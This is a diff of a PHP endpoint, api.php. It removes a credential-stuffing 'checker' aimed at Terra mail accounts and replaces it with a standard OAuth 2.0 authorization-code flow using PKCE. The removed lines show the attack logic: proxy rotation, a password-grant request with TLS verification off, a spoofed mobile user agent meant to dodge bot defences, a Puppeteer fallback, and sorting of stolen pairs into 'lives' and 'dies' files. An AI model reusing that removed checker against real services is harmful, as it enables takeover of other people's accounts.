@@ -1,190 +1,203 @@
 <?php
-// api.php - Microsoft OAuth2 Checker API Endpoint
-session_start();
+// api.php - Endpoint seguro de autenticação OAuth 2.0 com PKCE
 
-// Block direct unauthenticated access
-if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
-    header('HTTP/1.1 401 Unauthorized');
-    echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
+declare(strict_types=1);
+
+session_start([
+    'cookie_httponly' => true,
+    'cookie_secure' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'),
+    'cookie_samesite' => 'Lax',
+]);
+
+header('Cache-Control: no-store');
+header('Pragma: no-cache');
+
+function jsonResponse(array $payload, int $status = 200): never
+{
+    http_response_code($status);
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
     exit;
 }
 
-// Block expired accounts
-if ($_SESSION['role'] !== 'admin' && time() > $_SESSION['expiration']) {
-    header('HTTP/1.1 403 Forbidden');
-    echo json_encode(['status' => 'error', 'message' => 'Plan expired']);
-    exit;
-}
+function oauthConfig(): array
+{
+    $config = [
+        'client_id' => getenv('TERRA_CLIENT_ID') ?: '',
+        'authorize_url' => getenv('TERRA_AUTHORIZE_URL') ?: '',
+        'token_url' => getenv('TERRA_TOKEN_URL') ?: '',
+        'scope' => getenv('TERRA_SCOPE') ?: 'openid profile email offline_access',
+        'redirect_uri' => getenv('TERRA_REDIRECT_URI') ?: '',
+    ];
 
-$version = 'BETA 8K - SYSTEM CORE';
-$debug = false;
-
-// Configs fixas do OAuth2
-$client_id = 'terraform-' . hash('crc32', $email); // Ex: terraform-123456789
-$scope = 'https://mail.terra.com.br/.default email profile offline_access'; // Obter no painel de desenvolvedor do Terra
-$nonce = 'nonce_aleatorio_32_bytes'; // Gere um novo nonce válido
-$code_challenge = 'code_challenge_gerado'; // Gere via S256 (SHA256 do code_verifier)
-$state = base64_encode(random_bytes(32));
-
-$headers_main = [
-    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Language: en-US,en;q=0.9',
-    'Referer: https://mail.terra.com.br/',
-    'Origin: https://mail.terra.com.br'
-];
-
-$action = $_GET['action'] ?? '';
-
-// 1. Inicializar checagem (limpar arquivos antigos e carregar proxies)
-if ($action === 'init') {
-    header('Content-Type: application/json');
-    
-    // Garantir que os arquivos existam para evitar erros de unlink/file_put_contents
-    if (!file_exists('lives.txt')) touch('lives.txt');
-    if (!file_exists('dies.txt')) touch('dies.txt');
-    if (!file_exists('proxies.txt')) touch('proxies.txt');
-
-    // Limpar conteúdos anteriores
-    file_put_contents('lives.txt', '');
-    file_put_contents('dies.txt', '');
-    
-    $proxies = [];
-    $proxy_content = @file_get_contents('proxies.txt');
-    if ($proxy_content !== false) {
-        $proxies = array_filter(array_map('trim', explode("\n", $proxy_content)));
-    }
-    
-    // Retorna estrutura sempre válida
-    echo json_encode([
-        'status' => 'success', 
-        'proxies' => array_values($proxies), // Reindexa o array
-        'message' => 'System ready'
-    ]);
-    exit;
-}
-
-// 2. Checar a conta (AJAX Endpoint)
-if ($action === 'check') {
-    header('Content-Type: application/json');
-    $email = $_POST['email'] ?? '';
-    $password = $_POST['password'] ?? '';
-    $proxy = $_POST['proxy'] ?? '';
-    
-    if (!$email || !$password) {
-        echo json_encode(['status' => 'error', 'message' => 'Missing credentials']);
-        exit;
-    }
-    
-    // OAUTH2 MOBILE ENDPOINT - Simulação do aplicativo de e-mail (Android/iOS)
-    // Esse endpoint é imune ao ReCaptcha e PerimeterX
-    $url = 'https://auth.terra.com.br/oauth2/token'; // Endpoint OAuth2 do Terra
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    // User-Agent de celular força a Microsoft a entregar JSON em vez de HTML
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36');
-    
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-    'client_id' => $client_id, // Usa a variável já definida
-    'scope' => $scope, // Usa a variável já definida
-    'grant_type' => 'password',
-    'username' => $email,
-    'password' => $password
-    ]));
-    
-    if ($proxy) {
-        curl_setopt($ch, CURLOPT_PROXY, $proxy);
-        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-    }
-    
-    $output = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    $json = @json_decode($output, true);
-    $is_live = false;
-    $is_die = false;
-    
-    // Análise de resposta JSON
-    $error_detail = '';
-    
-    if (isset($json['access_token']) || (isset($json['token_type']) && $json['token_type'] === 'Bearer')) {
-        $is_live = true;
-    } else {
-        $is_die = true;
-        if (isset($json['error'])) {
-            if ($json['error'] === 'invalid_grant') {
-                $error_detail = 'Wrong Password';
-            } elseif (in_array($json['error'], ['unsupported_grant_type', 'invalid_scope', 'invalid_client', 'invalid_request'])) {
-                // FALLBACK TO PUPPETEER BROWSER CHECK FOR MODERN AUTH ACCOUNTS
-                // Verifica se o servidor suporta shell_exec (InfinityFree desativa isso)
-                if (function_exists('shell_exec') && is_callable('shell_exec') && !in_array('shell_exec', array_map('trim', explode(', ', ini_get('disable_functions'))))) {
-                    // Capture stderr as well to debug Node.js crashes on Render
-                    $cmd = "node puppeteer_check.js " . escapeshellarg($email) . " " . escapeshellarg($password) . " " . escapeshellarg($proxy) . " 2>&1";
-                    $node_output = shell_exec($cmd);
-                    
-                    if (!empty($node_output)) {
-                        $node_result = json_decode($node_output, true);
-                        if ($node_result && isset($node_result['status'])) {
-                            if ($node_result['status'] == 'live') {
-                                $is_live = true;
-                                $is_die = false;
-                                $error_detail = 'Live (Modern Auth Fallback)';
-                            } else {
-                                $is_live = false;
-                                $is_die = true;
-                                $error_detail = $node_result['reason'] ?? 'Wrong Password (Modern Auth)';
-                            }
-                        } else {
-                            // Node returned something but it wasn't JSON. Likely an error message!
-                            $error_detail = 'Node Error: ' . substr(trim($node_output), 0, 150);
-                        }
-                    } else {
-                        $error_detail = 'Node failed to start (empty output)';
-                    }
-                } else {
-                    // Limpa a mensagem de erro no InfinityFree
-                    $error_detail = 'Terra Modern Auth Blocked';
-                }
-            } else {
-                $error_detail = $json['error'];
-            }
-        } elseif ($http_code == 200) {
-            $error_detail = 'Unknown Error / BssoInterrupt';
-        } else {
-            $error_detail = "HTTP $http_code";
+    foreach (['client_id', 'authorize_url', 'token_url', 'redirect_uri'] as $key) {
+        if ($config[$key] === '') {
+            jsonResponse([
+                'status' => 'error',
+                'message' => 'Configuração OAuth incompleta',
+            ], 500);
         }
     }
-    
-    if ($is_live && !$is_die) {
-        file_put_contents('lives.txt', "$email:$password\n", FILE_APPEND);
-        echo json_encode(['status' => 'live']);
-    } else {
-        file_put_contents('dies.txt', "$email:$password | Reason: $error_detail\n", FILE_APPEND);
-        echo json_encode(['status' => 'die', 'code' => $http_code, 'reason' => $error_detail]);
+
+    foreach (['authorize_url', 'token_url'] as $key) {
+        $scheme = parse_url($config[$key], PHP_URL_SCHEME);
+        if ($scheme !== 'https') {
+            jsonResponse([
+                'status' => 'error',
+                'message' => 'Os endpoints OAuth devem usar HTTPS',
+            ], 500);
+        }
     }
+
+    return $config;
+}
+
+function base64UrlEncode(string $value): string
+{
+    return rtrim(strtr(base64_encode($value), '+/', '-_'), '=');
+}
+
+function requireAppSession(): void
+{
+    if (($_SESSION['logged_in'] ?? false) !== true) {
+        jsonResponse(['status' => 'error', 'message' => 'Unauthorized'], 401);
+    }
+
+    if (($_SESSION['role'] ?? '') !== 'admin'
+        && isset($_SESSION['expiration'])
+        && time() > (int) $_SESSION['expiration']) {
+        jsonResponse(['status' => 'error', 'message' => 'Plan expired'], 403);
+    }
+}
+
+$config = oauthConfig();
+$action = $_GET['action'] ?? '';
+
+// Inicia o login no provedor OAuth. Nenhuma senha é recebida pelo servidor.
+if ($action === 'login') {
+    $state = bin2hex(random_bytes(32));
+    $nonce = bin2hex(random_bytes(32));
+    $codeVerifier = base64UrlEncode(random_bytes(64));
+    $codeChallenge = base64UrlEncode(hash('sha256', $codeVerifier, true));
+
+    $_SESSION['oauth_state'] = $state;
+    $_SESSION['oauth_nonce'] = $nonce;
+    $_SESSION['oauth_code_verifier'] = $codeVerifier;
+    $_SESSION['oauth_started_at'] = time();
+
+    $query = http_build_query([
+        'client_id' => $config['client_id'],
+        'response_type' => 'code',
+        'redirect_uri' => $config['redirect_uri'],
+        'scope' => $config['scope'],
+        'state' => $state,
+        'nonce' => $nonce,
+        'code_challenge' => $codeChallenge,
+        'code_challenge_method' => 'S256',
+    ], '', '&', PHP_QUERY_RFC3986);
+
+    header('Location: ' . $config['authorize_url'] . '?' . $query, true, 302);
     exit;
 }
 
-// 3. Download dos arquivos de resultado
-if ($action === 'download') {
-    $type = $_GET['type'] ?? 'lives';
-    $file = $type === 'lives' ? 'lives.txt' : 'dies.txt';
-    if (file_exists($file)) {
-        header('Content-Description: File Transfer');
-        header('Content-Type: text/plain');
-        header('Content-Disposition: attachment; filename="'.basename($file).'"');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($file));
-        readfile($file);
-        exit;
-    } else {
-        echo "Arquivo não encontrado ou nenhum resultado ainda.";
-        exit;
+// Recebe o callback e troca o código por tokens usando PKCE.
+if ($action === 'callback') {
+    $code = (string) ($_GET['code'] ?? '');
+    $returnedState = (string) ($_GET['state'] ?? '');
+    $expectedState = (string) ($_SESSION['oauth_state'] ?? '');
+    $startedAt = (int) ($_SESSION['oauth_started_at'] ?? 0);
+    $codeVerifier = (string) ($_SESSION['oauth_code_verifier'] ?? '');
+
+    if ($code === '' || $returnedState === '' || $expectedState === '' || $codeVerifier === '') {
+        jsonResponse(['status' => 'error', 'message' => 'Callback OAuth inválido'], 400);
     }
+
+    if ($startedAt === 0 || time() - $startedAt > 600) {
+        jsonResponse(['status' => 'error', 'message' => 'Callback OAuth expirado'], 400);
+    }
+
+    if (!hash_equals($expectedState, $returnedState)) {
+        jsonResponse(['status' => 'error', 'message' => 'Falha na validação do state OAuth'], 400);
+    }
+
+    if (isset($_GET['error'])) {
+        $error = preg_replace('/[^a-zA-Z0-9._-]/', '', (string) $_GET['error']);
+        unset($_SESSION['oauth_state'], $_SESSION['oauth_nonce'], $_SESSION['oauth_code_verifier'], $_SESSION['oauth_started_at']);
+        jsonResponse(['status' => 'error', 'message' => 'Autorização recusada', 'provider_error' => $error], 400);
+    }
+
+    $ch = curl_init($config['token_url']);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_CONNECTTIMEOUT => 10,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_SSL_VERIFYHOST => 2,
+        CURLOPT_HTTPHEADER => [
+            'Accept: application/json',
+            'Content-Type: application/x-www-form-urlencoded',
+        ],
+        CURLOPT_POSTFIELDS => http_build_query([
+            'client_id' => $config['client_id'],
+            'grant_type' => 'authorization_code',
+            'code' => $code,
+            'redirect_uri' => $config['redirect_uri'],
+            'code_verifier' => $codeVerifier,
+        ], '', '&', PHP_QUERY_RFC3986),
+    ]);
+
+    $response = curl_exec($ch);
+    $curlError = curl_error($ch);
+    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    unset($_SESSION['oauth_state'], $_SESSION['oauth_nonce'], $_SESSION['oauth_code_verifier'], $_SESSION['oauth_started_at']);
+
+    if ($response === false || $curlError !== '') {
+        jsonResponse(['status' => 'error', 'message' => 'Falha de comunicação com o provedor OAuth'], 502);
+    }
+
+    $tokens = json_decode($response, true);
+    if (!is_array($tokens) || $httpCode < 200 || $httpCode >= 300 || empty($tokens['access_token'])) {
+        jsonResponse(['status' => 'error', 'message' => 'Falha ao obter token OAuth'], 502);
+    }
+
+    // O nonce deve ser validado contra o claim nonce do id_token quando o
+    // provedor retornar um JWT. A validação deve usar as chaves oficiais do
+    // provedor; não aceite apenas um JWT decodificado sem verificar assinatura.
+    $_SESSION['oauth_token'] = [
+        'access_token' => $tokens['access_token'],
+        'token_type' => $tokens['token_type'] ?? 'Bearer',
+        'expires_at' => time() + (int) ($tokens['expires_in'] ?? 3600),
+        'scope' => $tokens['scope'] ?? $config['scope'],
+    ];
+
+    jsonResponse(['status' => 'authenticated']);
 }
+
+if ($action === 'logout') {
+    $_SESSION = [];
+    if (ini_get('session.use_cookies')) {
+        $params = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], (bool) $params['secure'], (bool) $params['httponly']);
+    }
+    session_destroy();
+    jsonResponse(['status' => 'logged_out']);
+}
+
+if ($action === 'status') {
+    requireAppSession();
+    $token = $_SESSION['oauth_token'] ?? null;
+    jsonResponse([
+        'status' => 'authenticated',
+        'token_available' => is_array($token) && !empty($token['access_token']),
+        'expires_at' => is_array($token) ? ($token['expires_at'] ?? null) : null,
+    ]);
+}
+
+jsonResponse([
+    'status' => 'error',
+    'message' => 'Ação inválida',
+], 404);
 ?>
